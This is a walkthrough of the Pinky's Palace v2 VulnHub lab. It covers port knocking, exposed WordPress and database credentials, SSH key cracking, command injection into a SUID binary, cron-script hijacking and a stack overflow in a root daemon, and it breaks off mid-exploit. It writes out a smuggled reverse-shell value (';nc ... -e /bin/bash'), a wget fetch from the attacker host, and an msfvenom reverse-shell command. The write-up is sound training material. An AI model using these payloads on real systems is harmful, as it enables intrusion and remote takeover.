---
title: VulnHub - Pinky's Palace v2
author: ret2x
date: 2021-12-18 15:16:27 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, wordpress, file disclosure, lfi, bof]
image:
    path: /assets/images/pinkysv2/front.png
---

**Description:** A linux machine which implies applying various enumeration techniques and in this way to find the first foothold. To gain root privileges was taken advantage of misconfigurations and binary exploitation.

**Author:** Pink_Panther

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/pinkys-palace-v2,229/](https://www.vulnhub.com/entry/pinkys-palace-v2,229/)

## Information Gathering
### Host Discovery

A ping scan on the local network discovered the target machine, the script can be found [here](https://github.com/ret2x-tools/ping-scan.git).

```console
root@kali:~$ ping-scan.py -r 192.168.179.0/24
192.168.179.178 is up
```

### Port Scanning

With the aim of revealing open ports a full TCP port scan was performed.

```console
root@kali:~$ nmap -T4 -n -v -p1-65535 192.168.179.178 -oG nmap/all-tcp-ports.txt
...
PORT      STATE    SERVICE
80/tcp    open     http
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
```

### Service Enumeration

As we know, that only port 80 is open, we proceed to get more information about this port.

```console
root@kali:~$ nmap -sV -sC -n -v -p80 192.168.179.178 -oN nmap/service-enum.txt
...
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
...
```

### Web Enumeration

For a correct resolution of the web page, we add the following instruction to the hosts file on the attacking machine.

```console
root@kali:~$ echo '192.168.179.178 pinkydb' >> /etc/hosts
```

Now, We can browse in the web page, it's a wordpress.

![](/assets/images/pinkysv2/screenshot-1.png)

With wpscan we can do an additional enumeration in wordpress to detect vulnerable plugins and themes, as well as existing users.

```console
root@kali:~$ wpscan --url http://pinkydb/ -e vp,vt,u
...
[+] XML-RPC seems to be enabled: http://pinkydb/xmlrpc.php    
 | Found By: Direct Access (Aggressive Detection)             
 | Confidence: 100%
 ...
 [+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Rss Generator (Passive Detection)
 ...
[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).  
 | Found By: Rss Generator (Passive Detection)                             
 |  - http://pinkydb/?feed=rss2, <generator>https://wordpress.org/?v=4.9.4</generator> 
 |  - http://pinkydb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.9.4</generator>
...
[i] User(s) Identified:

[+] pinky1337
 | Found By: Author Posts - Display Name (Passive Detection)
 ...
```

This reveals the wordpress version and a user, with the objective of discovering more information, I ran dirb to find hidden web content.

```console
root@kali:~$ dirb http://pinkydb 
...
---- Scanning URL: http://pinkydb/ ----
+ http://pinkydb/index.php (CODE:301|SIZE:0)
==> DIRECTORY: http://pinkydb/secret/     
+ http://pinkydb/server-status (CODE:403|SIZE:295)
==> DIRECTORY: http://pinkydb/wordpress/ 
==> DIRECTORY: http://pinkydb/wp-admin/   
==> DIRECTORY: http://pinkydb/wp-content/  
==> DIRECTORY: http://pinkydb/wp-includes/ 
+ http://pinkydb/xmlrpc.php (CODE:405|SIZE:42)
...
```

At the previous exit, we can see a directory called secret, so we access to it.

![](/assets/images/pinkysv2/screenshot-2.png)

This contains three numbers as a sequence of ports and the word pinkydb.

![](/assets/images/pinkysv2/screenshot-3.png)

There is a technique called "Port Knoking" that allows us to open ports, when connecting to a series of ports in the correct order, I wrote a python script to discover the correct order of the sequence, in such a way it was possible to open the filtered ports found with nmap. 

```python
#!/usr/bin/env python3

import socket
import sys
import itertools
from time import sleep

host = "192.168.179.178"
ports = [8890, 7000, 666]

def connection(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        return True
    except:
        pass

permutation = itertools.permutations(ports)

for port in permutation:
    print(f"Trying  => {port[0]:5} {port[1]:5} {port[2]:5}")
    connection(port[0])
    connection(port[1])
    connection(port[2])
    sleep(2)

    if connection(31337):
        print(f"\nSuccess => {port[0]:5} {port[1]:5} {port[2]:5}")
        sys.exit(0)
```

We run the script, and find the correct sequence to open the ports.

```console
root@kali:~$ python3 knock.py            
Trying  =>  8890  7000   666
Trying  =>  8890   666  7000
Trying  =>  7000  8890   666
Trying  =>  7000   666  8890

Success =>  7000   666  8890
```

We can check if the filtered ports are open simply performing a re-scan.

```console
root@kali:~$ nmap -T4 -n -v -p4655,7654,31337 192.168.179.178
...
PORT      STATE SERVICE
4655/tcp  open  unknown
7654/tcp  open  unknown
31337/tcp open  Elite
...
```

Now, we can discover the service and version of the available ports.

```console
root@kali:~$ nmap -v -n -A -p4655,7654,31337 192.168.179.178
...
PORT      STATE SERVICE VERSION
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (ED25519)
7654/tcp  open  http    nginx 1.10.3
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  Elite?
| fingerprint-strings:
|   GenericLines, NULL:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|   GetRequest:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HTTP/1.0
|   SIPOptions:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|_    Accept: application/sdp
...
```

### Enumeration on port 7654

The web application that runs on port 7654 contains a login form, but we don't know the credentials.

![](/assets/images/pinkysv2/screenshot-4.png)

![](/assets/images/pinkysv2/screenshot-5.png)

I ran gobuster in order to discover any interesting information, but nothing.

```console
root@kali:~$ gobuster dir -u http://pinkydb:7654 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -x php,html
...
http://pinkydb:7654/index.php            (Status: 200) [Size: 134]
http://pinkydb:7654/login.php            (Status: 200) [Size: 545]
http://pinkydb:7654/config.php           (Status: 200) [Size: 0]
...
```

Then, I ran gobuster again this time specifying the IP address instead of the host name.

```console
root@kali:~$ gobuster dir -u http://192.168.179.178:7654 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e
...
http://192.168.179.178:7654/apache               (Status: 301) [Size: 185] [--> http://192.168.179.178:7654/apache/]
http://192.168.179.178:7654/nginx                (Status: 301) [Size: 185] [--> http://192.168.179.178:7654/nginx/] 
...
```

In this ocasion, two directories were found, then a simple enumeration with dirb under the apache directory discovered the same content as on port 80.


```console
root@kali:~$ dirb http://192.168.179.178:7654/apache/ -r
...
---- Scanning URL: http://192.168.179.178:7654/apache/ ----
+ http://192.168.179.178:7654/apache/.htaccess (CODE:200|SIZE:235) 
+ http://192.168.179.178:7654/apache/index.php (CODE:200|SIZE:418)
==> DIRECTORY: http://192.168.179.178:7654/apache/secret/       
==> DIRECTORY: http://192.168.179.178:7654/apache/wordpress/  
==> DIRECTORY: http://192.168.179.178:7654/apache/wp-admin/    
==> DIRECTORY: http://192.168.179.178:7654/apache/wp-content/  
==> DIRECTORY: http://192.168.179.178:7654/apache/wp-includes/ 
+ http://192.168.179.178:7654/apache/xmlrpc.php (CODE:200|SIZE:3065)
```

When verifying the resources found, I could see that it is possible to download the content web.

![](/assets/images/pinkysv2/screenshot-6.png)

We can use curl to download and read the wordpress configuration file.

```console
root@kali:~$ curl -s http://192.168.179.178:7654/apache/wp-config.php 
...
/** The name of the database for WordPress */
define('DB_NAME', 'pwp_db');

/** MySQL database username */
define('DB_USER', 'pinkywp');

/** MySQL database password */
define('DB_PASSWORD', 'pinkydbpass_wp');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
...
```

Under the nginx directory, the php files of the login form that run on port 7654 was found.

```console
root@kali:~$ dirb http://192.168.179.178:7654/nginx/pinkydb/
...
---- Scanning URL: http://192.168.179.178:7654/nginx/pinkydb/ ----
==> DIRECTORY: http://192.168.179.178:7654/nginx/pinkydb/html/    
                                                                          
---- Entering directory: http://192.168.179.178:7654/nginx/pinkydb/html/ ----
+ http://192.168.179.178:7654/nginx/pinkydb/html/index.php (CODE:200|SIZE:134)
...
```

We list the connection to the database.

```console
root@kali:~$ curl -s http://192.168.179.178:7654/nginx/pinkydb/html/config.php
<?php
        define('DB_HOST', 'localhost');
        define('DB_USER', 'secretpinkdbuser');
        define('DB_PASS', 'pinkyssecretdbpass');
        define('DB_NAME', 'secretsdb');
        $conn = mysqli_connect(DB_HOST,DB_USER,DB_PASS,DB_NAME);
?>
```

listing the login.php file, we see a link to a page that redirects a user when they have successfully logged in.

```console
root@kali:~$ curl -s http://192.168.179.178:7654/nginx/pinkydb/html/login.php | head -20
<?php
        include("config.php");
        $USER = mysqli_real_escape_string($conn,$_POST['user']);
        $PASS = mysqli_real_escape_string($conn,$_POST['pass']);
        $PASS = md5($PASS);
        $statement = "SELECT id FROM users WHERE username = '$USER' and password = '$PASS'";
        $result = mysqli_query($conn,$statement);
        $row = mysqli_fetch_array($result,MYSQLI_ASSOC);
        $active = $row['active'];
        $count = mysqli_num_rows($result);

        if ($count == 1)
        {
                header("Location: http://pinkydb:7654/pageegap.php?1337=filesselif1001.php");
        }
        else if ($count != 1)
        {
                echo "<center>Invalid Username or Password!</center>";
        }
```

This contains a link to an rsa key and a note.

![](/assets/images/pinkysv2/screenshot-7.png)

We first download the private key to the attacking machine.

```console
root@kali:~$ wget http://pinkydb:7654/credentialsdir1425364865/id_rsa
```

We review the note, it contains the username for the rsa key.

![](/assets/images/pinkysv2/screenshot-8.png)

Then, we convert the private key to a format that john can crack it.

```console
root@kali:~$ /usr/share/john/ssh2john.py id_rsa > ssh.hash

root@kali:~$ john ssh.has --wordlist=rockyou.txt --format=SSH
...
secretz101       (id_rsa)
```

Now, That the password is found, we can log in via SSH to the target machine.


To testing the parameter **1337**, was found that it is vulnerable to Local File Inclusion.

![](/assets/images/pinkysv2/screenshot-9.png)

## Exploitation
### Access via SSH

Before logging in, we need to grant the following permissions to the RSA private key.

```console
root@kali:~$ chmod 400 id_rsa
```

We access via SSH to the target machine.

```console
root@kali:~$ ssh stefano@192.168.179.178 -p 4655 -i id_rsa    
Enter passphrase for key 'id_rsa': 
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 17 21:18:01 2018 from 172.19.19.2
stefano@Pinkys-Palace:~$ id
uid=1002(stefano) gid=1002(stefano) groups=1002(stefano)
```

In the history file, from user stefano, there is a binary file that looks interesting.

```console
stefano@Pinkys-Palace:~$ cat .bash_history
...
cd /usr/local/bin
ls
ls -al
cat backup.sh
...
```

By listing the SUID binaries, was found the following binary in the stefano's home directory, we will use it to escalate privileges as the user pinky.

```console
stefano@Pinkys-Palace:~$ find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null 
-rwsr----x 1 pinky www-data 13384 Mar 16  2018 /home/stefano/tools/qsub
...
```

We execute the binary and it seems that it requires a message as input, in the same directory as the binary there is a note specifying that the program was made to send messages.

```console
stefano@Pinkys-Palace:~$ /home/stefano/tools/qsub 
/home/stefano/tools/qsub <Message>
stefano@Pinkys-Palace:~$ cat tools/note.txt 
Pinky made me this program so I can easily send messages to him.
```

We cannot analyze the binary file on the victim machine.

```console
stefano@Pinkys-Palace:~$ strings /home/stefano/tools/qsub 
strings: /home/stefano/tools/qsub: Permission denied
```

So the best thing we can do is download it to the attacking machine, to do this I will use the discovered Local File Inclusion vulnerability.

![](/assets/images/pinkysv2/screenshot-10.png)

```console
root@kali:~$ wget http://pinkydb:7654/pageegap.php?1337=/home/stefano/tools/qsub -O qsub
```

We give it execution privileges, using the strings command we see that the text displayed by echo is added to a file located in the pinky's home directory.

```console
root@kali:~$ chmod +x qsub
root@kali:~$ strings qsub
...
/bin/echo %s >> /home/pinky/messages/stefano_msg.txt  
%s <Message>                                           
TERM                                              
[+] Input Password:                         
Bad hacker! Go away!                 
[+] Welcome to Question Submit!    
[!] Incorrect Password!
...
```

When analyzing the binary with ltrace we can see that the value of the environment variable **$TERM** is used to compare with the password entered by the user, if they are the same, the message is sent otherwise it gives an error.

```console
root@kali:~$ ltrace ./qsub test
getenv("TERM")                                                                                       = "screen"
printf("[+] Input Password: ")                                                                       = 20
__isoc99_scanf(0x55bf60600cb5, 0x7ffd0b68dcd0, 0, 0[+] Input Password: password
)                                                 = 1
strlen("password")                                                                                   = 8
strcmp("password", "screen")                                                                         = -3
puts("[!] Incorrect Password!"[!] Incorrect Password!
)                                                                      = 24
exit(0 <no return ...>
+++ exited (status 0) +++
```

```console
root@kali:~$ ltrace ./qsub test
getenv("TERM")                                                                                       = "screen"
printf("[+] Input Password: ")                                                                       = 20
__isoc99_scanf(0x55b9ba000cb5, 0x7fffbc059980, 0, 0[+] Input Password: screen
)                                                 = 1
strlen("screen")                                                                                     = 6
strcmp("screen", "screen")                                                                           = 0
printf("[+] Welcome to Question Submit!")                                                            = 31
getegid()                                                                                            = 0
geteuid()                                                                                            = 0
setresgid(0, 0, 0, 0)                                                                                = 0
setresuid(0, 0, 0, 0)                                                                                = 0
asprintf(0x7fffbc059958, 0x55b9ba000c58, 0x7fffbc05b765, 0)                                          = 54
system("/bin/echo test >> /home/pinky/me"...sh: 1: cannot create /home/pinky/messages/stefano_msg.txt: Directory nonexistent
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                               = 512
[+] Welcome to Question Submit!+++ exited (status 0) +++
```

## Privilege Escalation
### Binary Exploitation

Now that we know how the binary works, we first need to start a netcat listener on port 443 in my case, and execute the following command on the target machine.

```console
stefano@Pinkys-Palace:~$ /home/stefano/tools/qsub ";nc 192.168.179.1 443 -e /bin/bash"
[+] Input Password: screen
```

We have a shell with pinky user privileges.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.178] 51210
script -qc /bin/bash /dev/null
pinky@Pinkys-Palace:~$ id
id
uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)
pinky@Pinkys-Palace:~$
```

Since we don't have the necessary privileges to edit the backup file, one way to bypass this is accessing through SSH.

We generate a pair of RSA keys.

```console
root@kali:~$ ssh-keygen -P "pinkys123" -f pinky_rsa
```

On the target machine we create the .ssh directory and in it we create the **authorized_keys** file that contains the public key, and grant all privileges to the owner of the file.

```console
pinky@Pinkys-Palace:/home/pinky$ mkdir .ssh
mkdir .ssh
pinky@Pinkys-Palace:/home/pinky$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCXuRltyrlhrthbnt7stOvfbRJ7aTQhbZ2ps/NMT+PMYBKacQOQ3QsLqTCIZ7KfKHp2029+k/8FviS58Zoz6omP6RYhJ8E6Ayt0gUt0e5LKTKTocrvk4dsmK9Qo6EvhlBDet11yabRuXKrH1btxOIfyb8F06lQDodvefg/BBMIk5wwAKVO5/m5kK2uT5wShEZR0bbUdsBEXLMLvPZv9wbrcDDSX9xBzHkYr+adddqqXF+faqt6hfvBri03fEv5Kyb/Txwj7h6PhY5fq5mFdze4XaL0AAY58HLju6cZlQ6P8hIKsms7a5lh7TDo+tfudULt+fK+ZyoEzVXoaRLDlq1CPrioujhs8OTn6mB1tLNNjw2LJW0z/AJDs4evbOFkYmaB6C8QL2TdHxqrZNP4xZ3F7ao8QG6hfrnnyQoLrhnSnH8SQRC4/YyfudiFlph4sVbSpHiQq/byHwAuG42tkT5QEun+/tW1GeYkNgGrC58tRXzvQHLklFniWvvNl7qpEtK8=' > .ssh/authorized_keys
GrC58tRXzvQHLklFniWvvNl7qpEtK8=' > .ssh/authorized_keyswAuG42tkT5QEun+/tW1GeYkNgG
pinky@Pinkys-Palace:/home/pinky$ chmod 700 .ssh/authorized_keys
chmod 700 .ssh/authorized_keys
pinky@Pinkys-Palace:/home/pinky$
```

We access via SSH as shown below.

```console
root@kali:~$ ssh pinky@192.168.179.178 -i pinky_rsa -p 4655
Enter passphrase for key 'pinky_rsa': 
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
pinky@Pinkys-Palace:~$
```

Now, we can edit the backup file, this is a script that is being executed by a cron job.

```console
pinky@Pinkys-Palace:~$ ls -la /usr/local/bin/backup.sh
-rwxrwx--- 1 demon pinky 113 Mar 17  2018 /usr/local/bin/backup.sh
pinky@Pinkys-Palace:~$ cat /usr/local/bin/backup.sh 
#!/bin/bash

rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
#
#
#
pinky@Pinkys-Palace:~$
```

### Cron Job

We add the following instructions to the backup.sh file, this creates the .ssh directory in the demon's home directory, we download the public key and save it in the .ssh directory, and grant all permissions to the owner.

```console
pinky@Pinkys-Palace:~$ echo 'mkdir /home/demon/.ssh &&\     
> wget 192.168.179.1/pinky_rsa.pub -O /home/demon/.ssh/authorized_keys &&\ 
> chmod 700 /home/demon/.ssh/authorized_keys' >> /usr/local/bin/backup.sh
```

Then, we start a python web server on port 80.

```console
root@kali:~$ python3 -m http.server 80
```

We wait a few minutes, and log in via SSH as user demon.

```console
root@kali:~$ ssh demon@192.168.179.178 -i pinky_rsa -p 4655
Enter passphrase for key 'pinky_rsa': 
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
demon@Pinkys-Palace:~$
```

By listing the writable files was found a rare binary, which also runs with root permissions.

```console
demon@Pinkys-Palace:~$ find / -writable -type f 2>/dev/null | egrep -v 'sys|proc'
/daemon/panel
...
```

```console
demon@Pinkys-Palace:~$ ps aux | grep /daemon/panel | head -n +2
root        479  0.0  0.1   4040   736 ?        Ss   17:58   0:00 /daemon/panel
root        483  0.0  0.0   4040    84 ?        S    17:58   0:00 /daemon/panel
```

We download it to the attacking machine.

```console
root@kali:~$ scp -P 4655 -i pinky_rsa demon@192.168.179.178:/daemon/panel panel 
Enter passphrase for key 'pinky_rsa': 
panel                                                           100%   13KB   2.9MB/s   00:00 
```

We grant execution permissions, and execute the binary.

```console
root@kali:~$ chmod +x panel
root@kali:~$ ./panel

```

We see that is running locally on port 31337, as on the target machine.

```console
root@kali:~/tr0ll2$ ss -ntpl
LISTEN         0              5                            0.0.0.0:31337                      0.0.0.0:*            users:(("panel",pid=18376,fd=3))
```

### Buffer Overflow

With gdb we disassemble the binary and list the functions.

```console
root@kali:~$ gdb -q ./panel
Reading symbols from ./panel...
(No debugging symbols found in ./panel)
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x0000000000400718  _init
0x0000000000400740  recv@plt
0x0000000000400750  strcpy@plt
0x0000000000400760  setsockopt@plt
0x0000000000400770  strlen@plt
0x0000000000400780  htons@plt
0x0000000000400790  send@plt
0x00000000004007a0  printf@plt
0x00000000004007b0  memset@plt
0x00000000004007c0  close@plt
0x00000000004007d0  listen@plt
0x00000000004007e0  bind@plt
0x00000000004007f0  accept@plt
0x0000000000400800  exit@plt
0x0000000000400810  wait@plt
0x0000000000400820  fork@plt
0x0000000000400830  socket@plt
0x0000000000400840  _start
0x0000000000400870  deregister_tm_clones
0x00000000004008b0  register_tm_clones
0x00000000004008f0  __do_global_dtors_aux
0x0000000000400910  frame_dummy
0x0000000000400936  fatal
0x0000000000400964  handlecmd
0x00000000004009ab  main
0x0000000000400b90  __libc_csu_init
0x0000000000400c00  __libc_csu_fini
0x0000000000400c04  _fini
```

The **handlecmd** function in probably taking user input, we disassemble this function to see what it contains.

```console
gdb-peda$ disas handlecmd
Dump of assembler code for function handlecmd:
   0x0000000000400964 <+0>:     push   rbp
   0x0000000000400965 <+1>:     mov    rbp,rsp
   0x0000000000400968 <+4>:     add    rsp,0xffffffffffffff80
   0x000000000040096c <+8>:     mov    QWORD PTR [rbp-0x78],rdi
   0x0000000000400970 <+12>:    mov    DWORD PTR [rbp-0x7c],esi
   0x0000000000400973 <+15>:    mov    rdx,QWORD PTR [rbp-0x78]
   0x0000000000400977 <+19>:    lea    rax,[rbp-0x70]
   0x000000000040097b <+23>:    mov    rsi,rdx
   0x000000000040097e <+26>:    mov    rdi,rax
   0x0000000000400981 <+29>:    call   0x400750 <strcpy@plt>
   0x0000000000400986 <+34>:    lea    rax,[rbp-0x70]
   0x000000000040098a <+38>:    mov    rdi,rax
   0x000000000040098d <+41>:    call   0x400770 <strlen@plt>
   0x0000000000400992 <+46>:    mov    rdx,rax
   0x0000000000400995 <+49>:    lea    rsi,[rbp-0x70]
   0x0000000000400999 <+53>:    mov    eax,DWORD PTR [rbp-0x7c]
   0x000000000040099c <+56>:    mov    ecx,0x0
   0x00000000004009a1 <+61>:    mov    edi,eax
   0x00000000004009a3 <+63>:    call   0x400790 <send@plt>
   0x00000000004009a8 <+68>:    nop
   0x00000000004009a9 <+69>:    leave  
   0x00000000004009aa <+70>:    ret
```

We can see the vulnerable function **strcpy**, I will try to cause a crash by sending a string of 200 characters, in gdb-peda it is possible to generate a string with a specified length, and locate the **rip** instruction.

```console
gdb-peda$ pattern_create 200                                                                                                                                        
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAU
AArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'  
```

I wrote a python script to send this string of 200 bytes.

```python
#!/usr/bin/env python3

import socket

host = "127.0.0.1"
port = 31337

buf= "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(buf.encode('latin'))
    print("Done")
except:
    print("Error")
```

We run the **panel** binary in gdb-peda.

```console
gdb-peda$ run                                            
Starting program: /root/pinkyspalace2/panel              
[Attaching after process 197786 fork to child process 197796]
[New inferior 2 (process 197796)]                    
[Detaching after fork from parent process 197786]    
[Inferior 1 (process 197786) detached]
Thread 2.1 "panel" received signal SIGSEGV, Segmentation fault.                                                                                                     
[Switching to process 197796]                                                                                                                                       
```

We run the script.

```console
root@kali:~$ python3 fuzz.py             
Done
```

As we can see this has caused a segmentation fault, also we can locate the exactly length to overwrite the return address.

```console
[----------------------------------registers-----------------------------------]                                                                                    
RAX: 0xc8                                                                                                                                                           
RBX: 0x0                                                                                                                                                            
RCX: 0x7ffff7ee5e7c (<__libc_send+28>:  cmp    rax,0xfffffffffffff000)                                                                                              
RDX: 0xc8                                                                                                                                                           
RSI: 0x7fffffffd2d0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAm
AARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")                                                                                                        
RDI: 0x4                                                                                                                                                            
RBP: 0x41414e4141384141 ('AA8AANAA')                                                                                                                                
RSP: 0x7fffffffd348 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RIP: 0x4009aa (<handlecmd+70>:  ret)
R8 : 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x400840 (<_start>:        xor    ebp,ebp)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4009a3 <handlecmd+63>:     call   0x400790 <send@plt>
   0x4009a8 <handlecmd+68>:     nop
   0x4009a9 <handlecmd+69>:     leave  
=> 0x4009aa <handlecmd+70>:     ret    
   0x4009ab <main>:     push   rbp
   0x4009ac <main+1>:   mov    rbp,rsp
   0x4009af <main+4>:   sub    rsp,0x1050
   0x4009b6 <main+11>:  call   0x400820 <fork@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd348 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0x7fffffffd350 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0x7fffffffd358 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0x7fffffffd360 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0032| 0x7fffffffd368 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0040| 0x7fffffffd370 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0048| 0x7fffffffd378 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0056| 0x7fffffffd380 ("AuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004009aa in handlecmd ()
gdb-peda$
```

We locate the exact offset at 120 bytes.

```console
gdb-peda$ pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 120
```

We run the binary again in gdb-peda.

```console
root@kali:~$ gdb -q ./panel
Reading symbols from ./panel...           
(No debugging symbols found in ./panel)   
gdb-peda$ r                               
Starting program: /root/pinkyspalace2/panel
[Attaching after process 10265 fork to child process 10269]
[New inferior 2 (process 10269)]                       
[Detaching after fork from parent process 10265]       
[Inferior 1 (process 10265) detached] 
```

We rebuild the python script, this time adding the offset with 120 A's and then with 6 B's, to check if we take control of the return address.

```python
#!/usr/bin/env python3

import socket

host = "127.0.0.1"
port = 31337

buf = "A" * 120 + "B" * 6

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(buf.encode('latin'))
    print("Done")
except:
    print("Error")
```

We run the script.

```console
root@kali:~$ python3 fuzz.py             
Done
```

As we can see the stack is overwritten with A's (41 hex equivalent), and the instruction pinter with 6 B's (42 hex equivalent).

```console
gdb-peda$ x/40wx $rsp
0x7fffffffd350: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd360: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd370: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd380: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd390: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd3a0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd3b0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd3c0: 0x41414141      0x41414141      0x42424242      0x00004242
0x7fffffffd3d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffd3e0: 0x00000000      0x00000000      0x00000000      0x00000000
gdb-peda$ x/wx $rip
0x424242424242: Cannot access memory at address 0x424242424242
```

Then, we find the address **0x400cfb** which jumps to the stack.

```console
gdb-peda$ jmpcall 
0x400728 : call rax
0x400895 : jmp rax
0x4008e3 : jmp rax
0x40092e : call rax
0x400cfb : call rsp
0x400d6b : call [rax]
```

The next step is to generate a shellcode of no more than 120 bytes, luckily for us the following msfvenom command generated a shellcode of 119 bytes.

```console
root@kali:~$ msfvenom --platform linux -a x64 -p linux/x64/shell_reverse_tcp lhost=192.168.179.1 lport=443 -e x64/xor -b "\x00" -f py -o shellcode
```

We rebuild our shellcode again adding first 1 NOP (\x90), then the shellcode (119 bytes), and finally the **call rsp** address, as shown in the following script.

```python
#!/usr/bin/env python3

import socket

host = "192.168.179.178"
port = 31337

buf = "\x90"
